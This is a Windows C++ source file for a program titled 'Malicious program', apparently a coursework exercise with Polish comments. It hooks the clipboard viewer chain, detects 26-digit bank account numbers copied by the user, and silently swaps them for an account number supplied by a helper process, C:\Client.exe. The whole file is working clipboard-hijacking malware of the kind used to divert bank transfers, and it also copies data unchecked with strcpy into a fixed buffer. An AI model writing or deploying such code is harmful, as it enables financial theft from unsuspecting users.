#ifndef UNICODE
#define UNICODE
#endif 
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>

static HWND hwndNxtVwr;
HWND hwnd;
char* accountNumber;

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
bool checkAccountNumber(char*);
void replaceAccountNumber();
void handleClipboard();

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {

    // Register the window class.
    const wchar_t CLASS_NAME[] = L"SampleWindowClass";

    WNDCLASS wc = { };

    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;

    RegisterClass(&wc);

    // Create the window.
    hwnd = CreateWindowEx(
        0,                              // Optional window styles.
        CLASS_NAME,                     // Window class
        L"Malicious program",           // Window text
        WS_OVERLAPPEDWINDOW,            // Window style

        // Size and position
        CW_USEDEFAULT, CW_USEDEFAULT, 300, 100,

        NULL,       // Parent window    
        NULL,       // Menu
        hInstance,  // Instance handle
        NULL        // Additional application data
    );

    if (hwnd == NULL) {
        return 0;
    }

    ShowWindow(hwnd, nCmdShow);

    accountNumber = (char*)malloc(sizeof(char) * 26);

    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Start the child process. 
    if (!CreateProcess(
        L"C:\\Client.exe",   // No module name (use command line)
        NULL,        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        0,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi)           // Pointer to PROCESS_INFORMATION structure
        )
    {
        return -1;
    }

    // Run the message loop.
    MSG msg = { };
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Wait until child process exits.
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Close process and thread handles. 
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_COPYDATA: {
            PCOPYDATASTRUCT pCDS = (PCOPYDATASTRUCT)lParam;
            strcpy(accountNumber, (char*)pCDS->lpData);
        } return 0;
        case WM_CREATE: {
            hwndNxtVwr = SetClipboardViewer(hwnd);
        } return 0;
        case WM_DESTROY: {
            ChangeClipboardChain(hwnd, hwndNxtVwr);
            PostQuitMessage(0);
        } return 0;
        case WM_DRAWCLIPBOARD: {
            if (hwndNxtVwr != NULL) {
                SendMessage(hwndNxtVwr, uMsg, wParam, lParam);
            }
            handleClipboard();
            InvalidateRect(hwnd, NULL, TRUE);
            return 0;

        } return 0;
        case WM_PAINT: {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);
            FillRect(hdc, &ps.rcPaint, (HBRUSH)(COLOR_WINDOW + 1));
            EndPaint(hwnd, &ps);
        } return 0;
        case WM_CHANGECBCHAIN: {
            if (wParam == (WORD)hwndNxtVwr) {
                hwndNxtVwr = (HWND)LOWORD(lParam); /* handle nowego nastepnika */
            }
            else {
                if (hwndNxtVwr != NULL) { /* musze powiadomic mojego nastepnika */
                    SendMessage(hwndNxtVwr, uMsg, wParam, lParam);
                }
            }
        } return 0;
        case WM_CLOSE: {
            DestroyWindow(hwnd);
        } return 0;
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

bool checkAccountNumber(char* accountNumber) {
    int length = strlen(accountNumber);
    if (length != 26) return false;
    for (int i = 0; i < strlen(accountNumber); i++) {
        if (accountNumber[i] < '0' || accountNumber[i] > '9') return false;
    }
    return true;
}

void replaceAccountNumber() {
    LPSTR pStr = accountNumber;
    SIZE_T wLen = strlen(accountNumber);
    HANDLE hGlMem = GlobalAlloc(GHND, (DWORD) wLen + 1);
    HANDLE lpGlMem = GlobalLock(hGlMem);
    memcpy(lpGlMem, pStr, wLen + 1);
    GlobalUnlock(hGlMem);
    OpenClipboard(hwnd);
    EmptyClipboard();
    SetClipboardData(CF_TEXT, hGlMem);
    CloseClipboard();
}

void handleClipboard() {
    if (IsClipboardFormatAvailable(CF_TEXT)) {
        OpenClipboard(hwnd);
        HANDLE hCbMem = GetClipboardData(CF_TEXT);
        HANDLE hProgMem = GlobalAlloc(GHND, GlobalSize(hCbMem));
        if (hProgMem != NULL) {
            LPSTR lpCbMem = (LPSTR) GlobalLock(hCbMem);
            LPSTR lpProgMem = (LPSTR) GlobalLock(hProgMem);
            strcpy(lpProgMem, lpCbMem);
            GlobalUnlock(hCbMem);
            GlobalUnlock(hProgMem);
            CloseClipboard();
            if (checkAccountNumber((char*)lpProgMem)) {
                replaceAccountNumber();
            }
        }
    }
}
